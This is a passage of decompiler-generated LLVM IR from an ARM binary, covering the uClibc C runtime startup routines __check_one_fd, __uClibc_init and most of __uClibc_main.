  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16758 = load i32, i32* @r4, align 4
  store i32 %v3_16758, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1677c

dec_label_pc_1677c:                               ; preds = %dec_label_pc_1677c.dec_label_pc_1677c_crit_edge, %dec_label_pc_1677c.lr.ph
  %v1_1677c = phi i32 [ %v1_16788, %dec_label_pc_1677c.dec_label_pc_1677c_crit_edge ], [ 0, %dec_label_pc_1677c.lr.ph ]
  %v0_1677c = phi i32 [ %v0_1677c.pre, %dec_label_pc_1677c.dec_label_pc_1677c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -8), %dec_label_pc_1677c.lr.ph ]
  %v4_1677c = mul i32 %v1_1677c, 4
  %v5_1677c = add i32 %v4_1677c, %v0_1677c
  %v6_1677c = inttoptr i32 %v5_1677c to i32*
  %v7_1677c = load i32, i32* %v6_1677c, align 4
  call void @__pseudo_branch(i32 %v7_1677c)
  %v0_16788 = load i32, i32* %r4.global-to-local, align 4
  %v1_16788 = add i32 %v0_16788, -1
  store i32 %v1_16788, i32* %r4.global-to-local, align 4
  %v2_16788 = icmp eq i32 %v0_16788, 0
  br i1 %v2_16788, label %dec_label_pc_16790, label %dec_label_pc_1677c.dec_label_pc_1677c_crit_edge

dec_label_pc_1677c.dec_label_pc_1677c_crit_edge:  ; preds = %dec_label_pc_1677c
  %v0_1677c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1677c

dec_label_pc_16790:                               ; preds = %dec_label_pc_1677c
  %v0_16794.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_16794 = add i32 %v0_16794.pre, 2032
  %v3_16794 = inttoptr i32 %v2_16794 to i32*
  %v4_16794 = load i32, i32* %v3_16794, align 4
  %v2_16798 = icmp eq i32 %v4_16794, 0
  br i1 %v2_16798, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_16790
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_16790, %bb
  %v2_167a0 = xor i1 %v2_16798, true
  call void @__pseudo_cond_branch(i1 %v2_167a0, i32 %v4_16794)
  %v0_167a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_167a8 = add i32 %v0_167a8, 2036
  %v3_167a8 = inttoptr i32 %v2_167a8 to i32*
  %v4_167a8 = load i32, i32* %v3_167a8, align 4
  %v2_167ac = icmp eq i32 %v4_167a8, 0
  br i1 %v2_167ac, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_167b4 = xor i1 %v2_167ac, true
  call void @__pseudo_cond_branch(i1 %v2_167b4, i32 %v4_167a8)
  %v2_167b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_167b8, i32* %r4.global-to-local, align 4
  %v1_167bc = load i32, i32* @r0, align 4
  ret i32 %v1_167bc

; uselistorder directives
  uselistorder i32 %v1_16788, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_167d4 = load i32, i32* @r4, align 4
  %v6_167d4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_167e8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_167f0 = icmp eq i32 %v2_167e8, -1
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r3, align 4
  br i1 %v3_167f0, label %dec_label_pc_167fc, label %dec_label_pc_16814

dec_label_pc_167fc:                               ; preds = %entry
  %v0_16800 = load i32, i32* @r5, align 4
  %v2_16808 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 -33916), i32 %v0_16800)
  %v1_1680c = load i32, i32* @r4, align 4
  %v1_16810 = icmp ne i32 %v2_16808, %v1_1680c
  call void @__pseudo_cond_branch(i1 %v1_16810, i32 ptrtoint (i32* @global_var_15134.740 to i32))
  br label %dec_label_pc_16814

dec_label_pc_16814:                               ; preds = %entry, %dec_label_pc_167fc
  %v1_1681c = phi i32 [ %v2_167e8, %entry ], [ %v2_16808, %dec_label_pc_167fc ]
  store i32 %v3_167d4, i32* @r4, align 4
  store i32 %v6_167d4, i32* @r5, align 4
  ret i32 %v1_1681c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_16814, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16828 = load i32, i32* @r4, align 4
  store i32 %v3_16828, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r4.global-to-local, align 4
  %v4_16838 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 148) to i32*), align 4
  %v1_1683c = inttoptr i32 %v4_16838 to i32*
  %v2_1683c = load i32, i32* %v1_1683c, align 4
  %v2_16840 = icmp eq i32 %v2_1683c, 0
  br i1 %v2_16840, label %dec_label_pc_16848, label %dec_label_pc_1686c

dec_label_pc_16848:                               ; preds = %entry
  store i32 4096, i32* %v1_1683c, align 4
  %v0_16850 = call i32 @__pthread_initialize_minimal()
  %v0_16858 = load i32, i32* %r4.global-to-local, align 4
  %v2_16858 = add i32 %v0_16858, -49412
  %v2_16860 = icmp eq i32 %v2_16858, 0
  br i1 %v2_16860, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_16848
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_16848, %bb
  %v2_16868 = xor i1 %v2_16860, true
  call void @__pseudo_cond_branch(i1 %v2_16868, i32 %v2_16858)
  %v2_1686c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1686c

dec_label_pc_1686c:                               ; preds = %entry, %bb4
  %v2_1686c = phi i32 [ %v2_1686c.pre, %bb4 ], [ %v3_16828, %entry ]
  %.0 = phi i32 [ %v0_16850, %bb4 ], [ undef, %entry ]
  store i32 %v2_1686c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1686c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 55384, i32* %r4.global-to-local, align 4
  %v1_1688c = add i32 %tmp, 4
  store i32 %v1_1688c, i32* %ip.global-to-local, align 4
  %v2_16890 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r4.global-to-local, align 4
  %v3_1689c = mul i32 %arg2, 4
  store i32 %v3_1689c, i32* @r7, align 4
  %v4_168a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 24) to i32*), align 4
  store i32 %v4_168a4, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_168ac = add i32 %v1_1688c, %v3_1689c
  store i32 %v2_168ac, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %stack_var_-416, align 4
  %v4_168b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 56) to i32*), align 4
  store i32 %v4_168b4, i32* %r4.global-to-local, align 4
  %v3_168b8 = icmp uge i32 %v2_168ac, %v2_16890
  store i1 %v3_168b8, i1* %cpsr_c.global-to-local, align 1
  %v9_168b8 = icmp eq i32 %v2_168ac, %v2_16890
  store i1 %v9_168b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_168c0 = inttoptr i32 %v4_168b4 to i32*
  store i32 %v2_168ac, i32* %v2_168c0, align 4
  br i1 %v9_168b8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_168c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_168c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_168c8 = inttoptr i32 %v1_168c8 to i32*
  store i32 %v0_168c8, i32* %v2_168c8, align 4
  %v2_168cc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_168cc, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2036, i32* %r2.global-to-local, align 4
  %v0_168d8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_168d8, i32* @r6, align 4
  br i1 %v9_168b8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_168e053 = add i32 %v2_168cc, 2036
  %v4_168e054 = inttoptr i32 %v3_168e053 to i32*
  store i32 %arg6, i32* %v4_168e054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_168dc = load i32, i32* %ip.global-to-local, align 4
  %v2_168dc = load i32, i32* @r7, align 4
  %v3_168dc = add i32 %v2_168dc, %v1_168dc
  store i32 %v3_168dc, i32* %r3.global-to-local, align 4
  %v3_168e050 = add i32 %v2_168cc, 2036
  %v4_168e051 = inttoptr i32 %v3_168e050 to i32*
  store i32 %arg6, i32* %v4_168e051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_168ec = load i32, i32* %r3.global-to-local, align 4
  %v2_168ec = load i32, i32* %r4.global-to-local, align 4
  %v3_168ec = inttoptr i32 %v2_168ec to i32*
  store i32 %v1_168ec, i32* %v3_168ec, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_168f0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_168f0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_168f8 = bitcast i32* %stack_var_-120 to i8*
  %v4_168f8 = call i32 @__GI_memset(i8* %v3_168f8, i32 0, i32 120)
  store i32 %v4_168f8, i32* %r0.global-to-local, align 4
  %v0_168fc = load i32, i32* %r4.global-to-local, align 4
  %v1_168fc = inttoptr i32 %v0_168fc to i32*
  %v2_168fc = load i32, i32* %v1_168fc, align 4
  br label %dec_label_pc_16908

dec_label_pc_16908:                               ; preds = %dec_label_pc_16908, %bb77
  %storemerge = phi i32 [ %v2_168fc, %bb77 ], [ %v1_16914, %dec_label_pc_16908 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_16908 = inttoptr i32 %storemerge to i32*
  %v2_16908 = load i32, i32* %v1_16908, align 4
  store i32 %v2_16908, i32* %r3.global-to-local, align 4
  %v2_1690c = icmp eq i32 %v2_16908, 0
  %v1_16914 = add i32 %storemerge, 4
  br i1 %v2_1690c, label %dec_label_pc_16914, label %dec_label_pc_16908

dec_label_pc_16914:                               ; preds = %dec_label_pc_16908
  store i32 %v1_16914, i32* @r4, align 4
  store i32 %v2_168f0, i32* @r5, align 4
  %v1_1693830 = inttoptr i32 %v1_16914 to i32*
  %v2_1693831 = load i32, i32* %v1_1693830, align 4
  store i32 %v2_1693831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1693c33 = icmp eq i32 %v2_1693831, 0
  store i1 %v2_1693c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1693c33, label %dec_label_pc_16944, label %dec_label_pc_16920

dec_label_pc_16920:                               ; preds = %dec_label_pc_16914, %dec_label_pc_16938
  %v4_16928 = phi i32 [ %v1_16934, %dec_label_pc_16938 ], [ %v1_16914, %dec_label_pc_16914 ]
  %v5_16924 = phi i32 [ %v2_16938, %dec_label_pc_16938 ], [ %v2_1693831, %dec_label_pc_16914 ]
  %v2_16920 = icmp ugt i32 %v5_16924, 13
  store i1 %v2_16920, i1* %cpsr_c.global-to-local, align 1
  %v7_16920 = icmp eq i32 %v5_16924, 14
  store i1 %v7_16920, i1* %cpsr_z.global-to-local, align 1
  %v2_16924 = xor i1 %v2_16920, true
  %v3_16924 = or i1 %v7_16920, %v2_16924
  br i1 %v3_16924, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_16920
  %v4_16924 = load i32, i32* @r5, align 4
  %v6_16924 = and i32 %v5_16924, 536870912
  %v7_16924 = icmp ne i32 %v6_16924, 0
  store i1 %v7_16924, i1* %cpsr_c.global-to-local, align 1
  %v8_16924 = mul i32 %v5_16924, 8
  %v9_16924 = add i32 %v4_16924, %v8_16924
  store i32 %v9_16924, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_16920, %bb78
  %v1_16930 = phi i1 [ %v2_16920, %dec_label_pc_16920 ], [ %v7_16924, %bb78 ]
  %v2_16928 = xor i1 %v1_16930, true
  %v3_16928 = or i1 %v7_16920, %v2_16928
  br i1 %v3_16928, label %bb80, label %dec_label_pc_16938

bb80:                                             ; preds = %bb79
  store i32 %v4_16928, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16938

dec_label_pc_16938:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_16928, i32 ptrtoint (i32* @global_var_13510.748 to i32))
  %v0_16934 = load i32, i32* @r4, align 4
  %v1_16934 = add i32 %v0_16934, 8
  store i32 %v1_16934, i32* @r4, align 4
  %v1_16938 = inttoptr i32 %v1_16934 to i32*
  %v2_16938 = load i32, i32* %v1_16938, align 4
  store i32 %v2_16938, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1693c = icmp eq i32 %v2_16938, 0
  store i1 %v2_1693c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1693c, label %dec_label_pc_16944, label %dec_label_pc_16920

dec_label_pc_16944:                               ; preds = %dec_label_pc_16938, %dec_label_pc_16914
  store i32 %v2_168f0, i32* %r0.global-to-local, align 4
  %v1_16948 = call i32 @_dl_aux_init(i32 %v2_168f0)
  store i32 %v1_16948, i32* %r0.global-to-local, align 4
  %v1_1694c = call i32 @__GI___uClibc_init(i32 %v1_16948)
  store i32 %v1_1694c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_16954 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16954, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1695c = add i32 %v2_16954, 148
  %v3_1695c = inttoptr i32 %v2_1695c to i32*
  %v4_1695c = load i32, i32* %v3_1695c, align 4
  store i32 %v4_1695c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16964 = icmp eq i32 %tmp66, 0
  store i1 %v2_16964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16964, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_16944
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_16944, %bb81
  %v0_16970 = phi i32 [ %tmp66, %dec_label_pc_16944 ], [ 4096, %bb81 ]
  %v3_1696c = icmp eq i32 %tmp65, -1
  store i1 %v3_1696c, i1* %cpsr_c.global-to-local, align 1
  %v8_1696c = icmp eq i32 %tmp65, -1
  store i1 %v8_1696c, i1* %cpsr_z.global-to-local, align 1
  %v2_16970 = inttoptr i32 %v4_1695c to i32*
  store i32 %v0_16970, i32* %v2_16970, align 4
  br i1 %v3_1696c, label %dec_label_pc_16978, label %dec_label_pc_169a0

dec_label_pc_16978:                               ; preds = %bb82
  %v0_16978 = call i32 @getuid()
  store i32 %v0_16978, i32* @r0, align 4
  store i32 %v0_16978, i32* %r4.global-to-local, align 4
  %v0_16980 = call i32 @geteuid()
  store i32 %v0_16980, i32* @r0, align 4
  %v3_16984 = icmp uge i32 %v0_16978, %v0_16980
  store i1 %v3_16984, i1* %cpsr_c.global-to-local, align 1
  %v9_16984 = icmp eq i32 %v0_16978, %v0_16980
  store i1 %v9_16984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16984, label %dec_label_pc_1698c, label %dec_label_pc_169c8

dec_label_pc_1698c:                               ; preds = %dec_label_pc_16978
  %v1_1698c = call i32 @getgid(i32 %v0_16980)
  store i32 %v1_1698c, i32* @r0, align 4
  store i32 %v1_1698c, i32* %r4.global-to-local, align 4
  %v0_16994 = call i32 @getegid()
  store i32 %v0_16994, i32* %r0.global-to-local, align 4
  %v3_16998 = icmp uge i32 %v1_1698c, %v0_16994
  store i1 %v3_16998, i1* %cpsr_c.global-to-local, align 1
  %v9_16998 = icmp eq i32 %v1_1698c, %v0_16994
  store i1 %v9_16998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16998, label %dec_label_pc_169a0, label %dec_label_pc_169c8

dec_label_pc_169a0:                               ; preds = %dec_label_pc_1698c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1696c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1696c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1696c, label %dec_label_pc_169f0, label %dec_label_pc_169ac

dec_label_pc_169ac:                               ; preds = %dec_label_pc_169a0
  store i32 %tmp64, i32* @r3, align 4
  %v3_169b0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_169b0, i1* %cpsr_c.global-to-local, align 1
  %v9_169b0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_169b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_169b0, label %dec_label_pc_169b8, label %dec_label_pc_169c8

dec_label_pc_169b8:                               ; preds = %dec_label_pc_169ac
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_169c0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_169c0, i1* %cpsr_c.global-to-local, align 1
  %v9_169c0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_169c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_169c0, label %dec_label_pc_169f0, label %dec_label_pc_169c8

dec_label_pc_169c8:                               ; preds = %dec_label_pc_169ac, %dec_label_pc_1698c, %dec_label_pc_16978, %dec_label_pc_169b8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_169d4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_169dc = load i32, i32* @r4, align 4
  store i32 %v0_169dc, i32* %r1.global-to-local, align 4
  %v2_169e0 = call i32 @__check_one_fd(i32 1, i32 %v0_169dc)
  %v0_169e4 = load i32, i32* @r4, align 4
  store i32 %v0_169e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_169ec = call i32 @__check_one_fd(i32 2, i32 %v0_169e4)
  store i32 %v2_169ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169b8, %dec_label_pc_169a0, %dec_label_pc_169c8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_169f8 = load i32, i32* %arg3, align 4
  store i32 %v2_169f8, i32* %r2.global-to-local, align 4
  %v2_169fc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_169fc, i32* %r1.global-to-local, align 4
  %v3_16a00 = add i32 %v2_169fc, 260
  %v4_16a00 = inttoptr i32 %v3_16a00 to i32*
  store i32 %v2_169f8, i32* %v4_16a00, align 4
  %v0_16a04 = load i32, i32* %r0.global-to-local, align 4
  %v1_16a04 = inttoptr i32 %v0_16a04 to i32*
  %v2_16a04 = load i32, i32* %v1_16a04, align 4
  store i32 %v2_16a04, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a08 = icmp eq i32 %v2_16a04, 0
  store i1 %v2_16a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a08, label %bb84, label %dec_label_pc_16a10

dec_label_pc_16a10:                               ; preds = %dec_label_pc_169f0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_16a14 = load i32, i32* %r1.global-to-local, align 4
  %v2_16a14 = add i32 %v0_16a14, 164
  %v3_16a14 = inttoptr i32 %v2_16a14 to i32*
  %v4_16a14 = load i32, i32* %v3_16a14, align 4
  store i32 %v4_16a14, i32* %r3.global-to-local, align 4
  %v2_16a18 = inttoptr i32 %v4_16a14 to i32*
  store i32 %v2_16a04, i32* %v2_16a18, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_16a20 = load i32, i32* %r0.global-to-local, align 4
  %v1_16a20 = inttoptr i32 %v0_16a20 to i32*
  %v2_16a20 = load i32, i32* %v1_16a20, align 4
  store i32 %v2_16a20, i32* %r0.global-to-local, align 4
  %v4_16a24 = call i32 @__GI_strrchr(i32 %v2_16a20, i32 47, i32 %v2_169f8, i32 %v4_16a14)
  store i32 %v4_16a24, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_16a2c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16a2c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a30 = icmp eq i32 %v4_16a24, 0
  store i1 %v2_16a30, i1* %cpsr_z.global-to-local, align 1
  %v2_16a34 = add i32 %v2_16a2c, 96
  %v3_16a34 = inttoptr i32 %v2_16a34 to i32*
  %v4_16a34 = load i32, i32* %v3_16a34, align 4
  store i32 %v4_16a34, i32* %r2.global-to-local, align 4
  br i1 %v2_16a30, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_16a10
  %v2_16a3c58 = inttoptr i32 %v4_16a34 to i32*
  store i32 0, i32* %v2_16a3c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_16a10
  %v2_16a38 = add i32 %v4_16a24, 1
  store i32 %v2_16a38, i32* %r3.global-to-local, align 4
  %v2_16a3c = inttoptr i32 %v4_16a34 to i32*
  store i32 %v4_16a24, i32* %v2_16a3c, align 4
  %v1_16a40 = load i32, i32* %r3.global-to-local, align 4
  %v2_16a40 = load i32, i32* %r2.global-to-local, align 4
  %v3_16a40 = inttoptr i32 %v2_16a40 to i32*
  store i32 %v1_16a40, i32* %v3_16a40, align 4
  br label %bb84

bb84:                                             ; preds = %.thread57, %bb83, %dec_label_pc_169f0
  %v2_16a50 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16a50, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_16a5c = add i32 %v2_16a50, -12
  store i32 %v2_16a5c, i32* %r5.global-to-local, align 4
  store i32 2032, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_16a6c = add i32 %v2_16a50, 2032
  %v4_16a6c = inttoptr i32 %v3_16a6c to i32*
  store i32 %arg5, i32* %v4_16a6c, align 4
  %v0_16a8418 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a8419 = load i32, i32* %r7.global-to-local, align 4
  %v3_16a8421 = icmp uge i32 %v0_16a8418, %v1_16a8419
  store i1 %v3_16a8421, i1* %cpsr_c.global-to-local, align 1
  %v9_16a8427 = icmp eq i32 %v0_16a8418, %v1_16a8419
  store i1 %v9_16a8427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a8421, label %dec_label_pc_16ab8.lr.ph, label %dec_label_pc_16a74

dec_label_pc_16a74:                               ; preds = %bb84, %dec_label_pc_16a74
  %v1_16a74 = phi i32 [ %v1_16a80, %dec_label_pc_16a74 ], [ %v0_16a8418, %bb84 ]
  %v0_16a74 = load i32, i32* %r5.global-to-local, align 4
  %v2_16a74 = and i32 %v1_16a74, 1073741824
  %v3_16a74 = icmp ne i32 %v2_16a74, 0
  store i1 %v3_16a74, i1* %cpsr_c.global-to-local, align 1
  %v4_16a74 = mul i32 %v1_16a74, 4
  %v5_16a74 = add i32 %v4_16a74, %v0_16a74
  %v6_16a74 = inttoptr i32 %v5_16a74 to i32*
  %v7_16a74 = load i32, i32* %v6_16a74, align 4
  store i32 %v7_16a74, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_16a74)
  %v0_16a80 = load i32, i32* %r4.global-to-local, align 4
  %v1_16a80 = add i32 %v0_16a80, 1
  store i32 %v1_16a80, i32* %r4.global-to-local, align 4
  %v1_16a84 = load i32, i32* %r7.global-to-local, align 4
  %v3_16a84 = icmp uge i32 %v1_16a80, %v1_16a84
  store i1 %v3_16a84, i1* %cpsr_c.global-to-local, align 1
  %v9_16a84 = icmp eq i32 %v1_16a80, %v1_16a84
  store i1 %v9_16a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a84, label %dec_label_pc_16ab8.lr.ph, label %dec_label_pc_16a74

dec_label_pc_16ab8.lr.ph:                         ; preds = %dec_label_pc_16a74, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a8c = icmp eq i32 %v0_168d8, 0
  store i1 %v2_16a8c, i1* %cpsr_z.global-to-local, align 1
  %v2_16a94 = xor i1 %v2_16a8c, true
  call void @__pseudo_cond_branch(i1 %v2_16a94, i32 %v0_168d8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_16aa0 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_16aac = add i32 %v2_16aa0, -12
  store i32 %v2_16aac, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16ab8

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge, %dec_label_pc_16ab8.lr.ph
  %v1_16ab8 = phi i32 [ %v1_16ac4, %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge ], [ 0, %dec_label_pc_16ab8.lr.ph ]
  %v0_16ab8 = phi i32 [ %v0_16ab8.pre, %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge ], [ %v2_16aac, %dec_label_pc_16ab8.lr.ph ]
  %v2_16ab8 = and i32 %v1_16ab8, 1073741824
  %v3_16ab8 = icmp ne i32 %v2_16ab8, 0
  store i1 %v3_16ab8, i1* %cpsr_c.global-to-local, align 1
  %v4_16ab8 = mul i32 %v1_16ab8, 4
  %v5_16ab8 = add i32 %v4_16ab8, %v0_16ab8
  %v6_16ab8 = inttoptr i32 %v5_16ab8 to i32*
  %v7_16ab8 = load i32, i32* %v6_16ab8, align 4
  store i32 %v7_16ab8, i32* %ip.global-to-local, align 4
  store i32 92868, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_16ab8)
  %v0_16ac4 = load i32, i32* @r4, align 4
  %v1_16ac4 = add i32 %v0_16ac4, 1
  store i32 %v1_16ac4, i32* @r4, align 4
  %v1_16ac8 = load i32, i32* @r7, align 4
  %v3_16ac8 = icmp uge i32 %v1_16ac4, %v1_16ac8
  store i1 %v3_16ac8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ac8 = icmp eq i32 %v1_16ac4, %v1_16ac8
  store i1 %v9_16ac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16ac8, label %dec_label_pc_16ad0, label %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge

dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge:  ; preds = %dec_label_pc_16ab8
  %v0_16ab8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16ab8

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16ab8
  %v2_16ad4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_16ad4.pre, i32* %r0.global-to-local, align 4
